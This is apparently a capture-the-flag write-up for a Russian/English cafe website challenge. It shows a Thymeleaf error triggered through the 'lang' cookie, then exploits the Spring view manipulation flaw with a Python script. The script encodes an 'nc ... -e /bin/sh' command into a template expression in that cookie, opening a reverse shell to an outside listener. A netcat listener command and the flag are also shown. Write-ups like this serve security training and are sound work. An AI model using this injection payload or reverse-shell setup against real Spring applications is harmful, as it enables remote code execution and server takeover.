#### Challenge:

We made a little cafe for all the ctfers to relax after the competition. The website is available in russian and english. [151.236.114.211:7878](http://151.236.114.211:7878/)

Try to find the flag somewhere in /

---

#### Solution:

- after playing with page we can see that it changes localization via `lang` cookie, however it supports only `en`/`ru` anything else causes error

```console
curl 'http://151.236.114.211:7878/' -H 'Cookie: lang=ro' | jq .
{
  "timestamp": "2021-02-28T09:25:20.493+00:00",
  "status": 500,
  "error": "Internal Server Error",
  "exception": "org.thymeleaf.exceptions.TemplateInputException",
  "message": "",
  "path": "/"
}
```

- `thymeleaf` is templating engine for `java`, after looking for potential issues we found [spring-view-manipulation-vulnerability](https://www.veracode.com/blog/secure-development/spring-view-manipulation-vulnerability) that points us to simple code execution and reverse shell setup via `__${T(java.lang.Runtime).getRuntime().exec("nc ip port -e /bin/sh")}__::.x`

```bash
echo cat /try_find_me.txt | nc -lp 64999 # reverse shell setup
```

```python
import requests
import sys


def encode(s):
    ret = ''
    for c in s:
        if ret == '':
            ret += f'T(java.lang.Character).toString({ord(c)})'
        else:
            ret += '.concat(' + \
                f'T(java.lang.Character).toString({ord(c)})' + ')'
    return ret

shell_ip = '20.82.8.5'
shell_port = '64999'

cmd = 'nc ' + shell_ip + ' ' + shell_port + ' -e /bin/sh'

cookies = {
    'lang': '__${T(java.lang.Runtime).getRuntime().exec('+encode(cmd)+')}__::..x'.strip()
}
print(cmd)

s = requests.session()
r = s.get('http://151.236.114.211:7878/', cookies=cookies)
print(r.text)

```

---

<details><summary>FLAG:</summary>

```
Aero{j4va_1s_better_th4n_engl1sh}
```

</details>
<br/>
